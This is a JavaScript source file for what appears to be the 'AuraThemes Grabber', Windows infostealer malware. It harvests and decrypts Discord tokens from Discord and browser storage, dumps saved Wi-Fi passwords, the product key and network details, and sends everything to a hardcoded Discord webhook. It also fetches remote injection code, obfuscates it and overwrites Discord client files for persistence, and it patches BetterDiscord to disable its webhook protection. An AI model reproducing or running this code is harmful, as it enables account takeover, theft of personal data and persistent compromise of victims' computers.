const { execSync, spawnSync, exec } = require("child_process");
const buffreplace = require("buffer-replace");
const DiscordToken = require("discord.js-token");
const crypto = require("crypto");
const fs = require("fs");
const path = require("path");
const aura = require("win-dpapi");
const axios = require("axios");

let allTokens = [];
let injectPaths = []; 

const killDiscords = false; //(true) to restart all Discord processes, (false) for the opposite.
const webhook = "https://discord.com/api/webhooks/1175475967544807434/qwT-uGc6lbkDYcNee0rbG_mImqsWIYicjbA7zbgrvu-WIYCCefjqQ-E2J2JA-S3Qfs7J";

switch (process.platform) {
  case "win32":
    let appdata = process.env.appdata,
      localappdata = process.env.localappdata,
      paths = [`${appdata}/discord/`,`${appdata}/discordcanary/`,`${appdata}/discordptb/`,`${appdata}/discorddevelopment/`,`${appdata}/lightcord/`,`${appdata}/Opera Software/Opera Stable/`,`${appdata}/Opera Software/Opera GX Stable/`,`${localappdata}/Google/Chrome/User Data/Default/`,`${localappdata}/Google/Chrome/User Data/Profile 1/`,`${localappdata}/Google/Chrome/User Data/Profile 2/`,`${localappdata}/Google/Chrome/User Data/Profile 3/`,`${localappdata}/Google/Chrome/User Data/Profile 4/`,`${localappdata}/Google/Chrome/User Data/Profile 5/`,`${localappdata}/Google/Chrome/User Data/Guest Profile/`,`${localappdata}/Google/Chrome/User Data/Default/Network/`,`${localappdata}/Google/Chrome/User Data/Profile 1/Network/`,`${localappdata}/Google/Chrome/User Data/Profile 2/Network/`,`${localappdata}/Google/Chrome/User Data/Profile 3/Network/`,`${localappdata}/Google/Chrome/User Data/Profile 4/Network/`,`${localappdata}/Google/Chrome/User Data/Profile 5/Network/`,`${localappdata}/Google/Chrome/User Data/Guest Profile/Network/`,`${localappdata}/Microsoft/Edge/User Data/Default/`,`${localappdata}/Microsoft/Edge/User Data/Profile 1/`,`${localappdata}/Microsoft/Edge/User Data/Profile 2/`,`${localappdata}/Microsoft/Edge/User Data/Profile 3/`,`${localappdata}/Microsoft/Edge/User Data/Profile 4/`,`${localappdata}/Microsoft/Edge/User Data/Profile 5/`,`${localappdata}/Microsoft/Edge/User Data/Guest Profile/`,`${localappdata}/Microsoft/Edge/User Data/Default/Network/`,`${localappdata}/Microsoft/Edge/User Data/Profile 1/Network/`,`${localappdata}/Microsoft/Edge/User Data/Profile 2/Network/`,`${localappdata}/Microsoft/Edge/User Data/Profile 3/Network/`,`${localappdata}/Microsoft/Edge/User Data/Profile 4/Network/`,`${localappdata}/Microsoft/Edge/User Data/Profile 5/Network/`,`${localappdata}/Microsoft/Edge/User Data/Guest Profile/Network/`],
      cords = ["discord","discordcanary","discordptb","discorddevelopment","lightcord"];

      axios
        .get('https://discord.com')
        .then(() => {startup()})
        .catch(() => {startup()});
      
        function startup() {
          discordInjected();
          sendAll();
          fs.readdirSync(__dirname).forEach((a) => {
            if (a.endsWith(".xml")) {
              fs.unlinkSync(path.join(__dirname, a));
            }
          });
        }
        
        async function find(p) {
          let tail = p;
          p += "Local Storage/leveldb";
          if (!cords.some((d) => tail.includes(d))) {
            try {
              fs.readdirSync(p).map((f) => {
                (f.endsWith(".log") || f.endsWith(".ldb")) &&
                  fs
                    .readFileSync(`${p}/${f}`, "utf8")
                    .split(/\r?\n/)
                    .forEach((l) => {
                      const patterns = [
                        new RegExp(/mfa\.[\w-]{84}/g),
                        new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g),
                      ];
                      for (const p of patterns) {
                        const foundTokens = l.match(p);
                        if (foundTokens) {
                          foundTokens.forEach((tkn) => {
                            if (!allTokens.includes(tkn)) return allTokens.push(tkn);
                          });
                        }
                      }
                    });
              });
            } catch {}
            return;
          } else {
            if (fs.existsSync(`${tail}/Local State`)) {
              try {
                fs.readdirSync(p).map((f) => {
                  (f.endsWith(".log") || f.endsWith(".ldb")) &&
                    fs
                      .readFileSync(`${p}/${f}`, "utf8")
                      .split(/\r?\n/)
                      .forEach((l) => {
                        const pattern = new RegExp(
                          /dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*/g,
                        );
                        const foundTokens = l.match(pattern);
                        if (foundTokens) {
                          foundTokens.forEach((tkn) => {
                            let enc = Buffer.from(
                              JSON.parse(fs.readFileSync(`${tail}/Local State`))
                                .os_crypt.encrypted_key,
                              "base64",
                            ).slice(5);
                            let key = aura.unprotectData(
                              Buffer.from(enc, "utf-8"),
                              null,
                              "CurrentUser",
                            );
                            const tkns = Buffer.from(
                              tkn.split("dQw4w9WgXcQ:")[1],
                              "base64",
                            );
                            let run = tkns.slice(3, 15),
                              mid = tkns.slice(15, tkns.length - 16);
                            let decyph = crypto.createDecipheriv(
                              "aes-256-gcm",
                              key,
                              run,
                            );
                            decyph.setAuthTag(
                              tkns.slice(tkns.length - 16, tkns.length),
                            );
                            let out =
                              decyph.update(mid, "base64", "utf-8") +
                              decyph.final("utf-8");
                            if (!allTokens.includes(out)) return allTokens.push(out);
                          });
                        }
                      });
                });
              } catch {}
              return;
            }
          }
        }

        async function sendAll() {
          for (let path of paths) {
            await find(path);
          }

          for (let a of allTokens) {
            let e;
            await axios.get(`https://discord.com/api/v9/users/@me`, {
              headers: {
                "Content-Type": "application/json",
                authorization: a,
              },
            })
            .then((g) => {
              e = g.data;
            })
            .catch(() => {
              e = null;
            });

            if (!e) continue;
            var copy = `https://aurathemes.xyz/f?token=${a}`;
            let embed = await getEmbed();
            let pc = getSystemInfo();
            var Discord = new DiscordToken(a, pc.GetIpAddress, e.password).info;
            var color = "#c267ff"
            var Gifts = Object.entries(Discord.Gifts).map(([key, value]) => ({
              name: "Code " + key,
              value:
                typeof value === "object"
                  ? `\`\`\`json\n${JSON.stringify(value, null, 2)?JSON.stringify(value, null, 2):"None"}\n\`\`\``
                  : value.toString(),
            }));
            axios.post(webhook, {
              username: "@AuraThemes",
              avatar_url: embed.avatar,
              embeds: [
                {
                  color: parseInt(color.replaceAll("#", ""), 16),
                  thumbnail: Discord.avatar,
                  author: { name: `${e.username}#${e.discriminator} | ${e.id}`, icon_url: Discord.avatar },
                  fields: [
                    { name: "<a:aura:1087044506542674091> Token", value: `\`\`\`${a}\`\`\`\n[[Click Here To Copy Your Token]](${copy})`},
                    { name: "<a:aura:938925934751399936> Nitro", value: `${Discord.nitroType}`, inline: true },
                    { name: "`💜` Email", value: `\`${e.email}\``, inline: true },
                    { name: "`💜` IP Adress", value: `\`${pc.GetIpAddress}\``, inline: true },
                    { name: "`💜` Phone", value: `\`${Discord.phone}\``, inline: true },
                    { name: "Badges", value: `${Discord.badges}`, inline: true },
                    { name: "Billing", value: `${Discord.billing}`, inline: true },
                  ],
                  footer: { text: `AuraThemes Grabber - ${embed.url}`, icon_url: embed.footericon },
                },
                {
                  color: parseInt(color.replaceAll("#", ""), 16),
                  title: "Strange Friend(s)",
                  author: { name: `${e.username}#${e.discriminator} | ${e.id}`, icon_url: Discord.avatar },
                  description: `${Discord.StrangeFriends ? Discord.StrangeFriends : `\`\`\`\nNot found\`\`\``}`,
                  footer: { text: `AuraThemes Grabber - ${embed.url}`, icon_url: embed.footericon },
                },
                {
                  color: parseInt(color.replaceAll("#", ""), 16),
                  title: "User Informatio(s)",
                  author: { name: `${e.username}#${e.discriminator} | ${e.id}`, icon_url: Discord.avatar },
                  fields: [
                    { name: "NSFW", value: `${Discord.NSFW}`, inline: !0},
                    { name: "Verified", value: Discord.verified, inline: !0 },
                    { name: "Status", value: Discord.status , inline: !0 },
                    { name: "Owner Servers", value: `\`${Discord.totalOwnedGuild}\``, inline: !0 },
                    { name: "Connection", value: `\`${Discord.totalConnection}\``, inline: !0 },
                    { name: "BOTS/RPC", value: `\`${Discord.totalApplication}\``, inline: !0 },
                    { name: "Blocked", value: `\`${Discord.totalBlocked}\``, inline: !0 },
                    { name: "Servers", value: `\`${Discord.totalGuild}\``, inline: !0 },
                    { name: "Friends", value: `\`${Discord.totalFriend}\``, inline: !0 },
                    { name: "Theme", value: `\`${Discord.theme}\``, inline: !0 },
                    { name: "Pending", value: `\`${Discord.pending}\``, inline: !0 },
                    { name: "Biography", value: `\`\`\`\n${Discord.bio}\n\`\`\``, inline: !0 },
                  ],
                  footer: { text: `AuraThemes Grabber - ${embed.url}`, icon_url: embed.footericon },
                },
                {
                  color: parseInt(color.replaceAll("#", ""), 16),
                  title: "Gifts Code(s)",
                  author: { name: `${e.username}#${e.discriminator} | ${e.id}`, icon_url: Discord.avatar },
                  fields: Gifts,
                  footer: { text: `AuraThemes Grabber - ${embed.url}`, icon_url: embed.footericon },
                },
                {
                  color: parseInt(color.replaceAll("#", ""), 16),
                  title: "System Informatio(s)",
                  author: { name: `${e.username}#${e.discriminator} | ${e.id}`, icon_url: Discord.avatar },
                  fields: [
                    { name: "Wifi Password(s)", value: `\`\`\`\n${pc.WifiPass ? pc.WifiPass: `Not found`}\`\`\``, inline: false },
                    { name: "User", value: `\`\`\`\nUsername: ${pc.UserName}\nHostname: ${pc.UserName}\`\`\``, inline: false },
                    { name: "System", value: `\`\`\`\nCPU: ${pc.CpuModel}\nUUID: ${pc.UUID}\nMAC ADDRESS: ${pc.MacAddress}\nKEY PRODUCT: ${pc.ProductKey}\nLOCAL IP: ${pc.LocalIp}\nIP ADDRESS: ${pc.GetIpAddress}\`\`\``, inline: false },
                    { name: "Network", value: `\`\`\`\nPUBLIC: ${pc.GetIpAddress}\nCountry: ${Discord.IP.country}\nRegion: ${Discord.IP.region}\nCity: ${Discord.IP.city}\nLatitude: ${Discord.IP.latitude}\nLongitude: ${Discord.IP.Longitude}\nIPS: ${Discord.IP.ips}\nTime Zone: ${Discord.IP.timezone}\nCurrency Code: ${Discord.IP.currency_code}\`\`\``, inline: false },
                  ],
                  footer: { text: `AuraThemes Grabber - ${embed.url}`, icon_url: embed.footericon },
                },
              ],
            })
            .then(() => {})
            .catch(() => {});
            continue;
          }
        }

        async function discordInjected() {
          const discords = fs
            .readdirSync(localappdata)
            .filter((file) => file.includes("iscord"))
            .map((file) => path.join(localappdata, file));
          for (const paths of discords) {
            findIndex(paths);
          }
          for (const paths of discords) {
            await findInject(paths);
          }
          await inject();
          await betterbroke();
          if (killDiscords) {
            await killAllDiscord();
          }
        }

        async function getEmbed() {
          const embed = JSON.parse(Buffer.from("eyJkaXNjb3JkIjoiaHR0cHM6Ly9kaXNjb3JkLmdnLzdoNUREVXAyeUMiLCJhdmF0YXJfdXJsIjoiaHR0cHM6Ly9pLmltZ3VyLmNvbS95Vm5PU2VTLmdpZiIsImZvb3Rlcl91cmwiOiJodHRwczovL2kuaW1ndXIuY29tL0NlRnFKT2MuZ2lmIn0=", 'base64').toString('utf-8'));
          return {
            avatar: embed.avatar_url,
            url: embed.discord,
            footericon: embed.footer_url,
          };
        }

        function findIndex(f) {
          let discordPaths = fs.readdirSync(f);
          discordPaths.forEach((file) => {
            let filePath = path.join(f, file);
            let fileStat = fs.statSync(filePath);
            if (fileStat.isDirectory()) {
              findIndex(filePath);
            } else {
              if (
                file === "index.js" &&
                !f.includes("node_modules") &&
                f.includes("desktop_core")
              ) {
                injectPaths.push(filePath);
              }
            }
          });
        }

        async function findInject(f) {
          const files = await fs.promises.readdir(f);
          for (const file of files) {
            const filePath = path.join(f, file);
            const fileStat = await fs.promises.stat(filePath);
            if (fileStat.isDirectory()) {
              if (file === "aura") {
                await fs.rmdirSync(filePath);
              } else {
                await findInject(filePath);
              }
            }
          }
        }

        async function inject() {
          let resp = await axios.get("https://6889.fun/api/aurathemes/inject", { headers: { aurathemes: true } });
          let { getObfuscatedCode } = require("javascript-obfuscator").obfuscate(resp.data.replace("*WEBHOOK*", webhook), { ignoreRequireImports: true,compact: true,controlFlowFlattening: true,controlFlowFlatteningThreshold: 0.5,deadCodeInjection: false,deadCodeInjectionThreshold: 0.01,debugProtection: false,debugProtectionInterval: 0,disableConsoleOutput: true,identifierNamesGenerator: "hexadecimal",log: false,numbersToExpressions: false,renameGlobals: false,selfDefending: false,simplify: true,splitStrings: false,splitStringsChunkLength: 5,stringArray: true,stringArrayEncoding: ["base64"],stringArrayIndexShift: true,stringArrayRotate: false,stringArrayShuffle: false,stringArrayWrappersCount: 5,stringArrayWrappersChainedCalls: true,stringArrayWrappersParametersMaxCount: 5,stringArrayWrappersType: "function",stringArrayThreshold: 1,transformObjectKeys: false,unicodeEscapeSequence: false },);
          let payload = getObfuscatedCode();
          injectPaths.forEach((file) => {
            try {
              fs.writeFileSync(file, payload, { encoding: "utf8", flag: "w" });
            } catch {}
          });
        }

        function betterbroke() {
          let dir = `${localappdata}/BetterDiscord/data/betterdiscord.asar`;
          if (fs.existsSync(dir)) {
            fs.writeFileSync(dir, buffreplace(fs.readFileSync(dir), "api/webhooks", "aurathemesontop"));
          }
          return;
        }

        async function killAllDiscord() {
          const execx = require("util").promisify(exec);
          const clients = ["Discord.exe","DiscordCanary.exe","DiscordDevelopment.exe","DiscordPTB.exe"];
          try {
            const { stdout } = await execx("tasklist");
            for (const c of clients) {
              if (stdout.includes(c)) {
                await killAndRestartClient(c);
              }
            }
          } catch {}
        }

        async function killAndRestartClient(c) {
          try {
            await exec(`taskkill /F /T /IM ${c}`);
            const clientPath = `${localappdata}/${c.replace(".exe","")}/Update.exe`;
            await exec(`"${clientPath}" --processStart ${c}`);
          } catch {}
        }

        function getSystemInfo() {
          try {
            return { Ram: execSync("wmic os get TotalVisibleMemorySize").toString().split("\r\n")[1].trim() + " KB",UserName: execSync("echo %USERNAME%").toString().trim(),UUID: execSync("powershell.exe (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID").toString().split("\r\n")[0],MacAddress: execSync("powershell.exe (Get-CimInstance -ClassName 'Win32_NetworkAdapter' -Filter 'NetConnectionStatus = 2').MACAddress").toString().split("\r\n")[0],ProductKey: spawnSync('powershell', ['Get-ItemPropertyValue', '-Path', '\'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform\'', '-Name', 'BackupProductKeyDefault']).stdout.toString().trim(),LocalIp: execSync("powershell.exe (Get-NetIPAddress).IPAddress").toString().split('\r\n')[0],CpuModel: execSync("wmic cpu get caption").toString().split("\r\r\n")[1].trim(),GetIpAddress: execSync("powershell.exe (Resolve-DnsName -Name myip.opendns.com -Server 208.67.222.220).IPAddress").toString().split("\r\n")[0],WifiPass: execSync(`netsh wlan export profile key=clear;Get-ChildItem *.xml | ForEach-Object {$xml = [xml](get-content $_);$a = $xml.WLANProfile.SSIDConfig.SSID.name + ": " + $xml.WLANProfile.MSM.Security.sharedKey.keymaterial;$a;}`, { shell: "powershell.exe" }).toString().split("\r\n").filter(l => l.includes(": ")).map(l => l.replace(/�\?T/g, "'")).join("\n") };
          } catch {
            return {};
          }
        }
        break;
      default:
        break;
}

process
  .on("uncaughtException", (err) => console.error(err))
  .on("unhandledRejection", (err) => console.error(err));
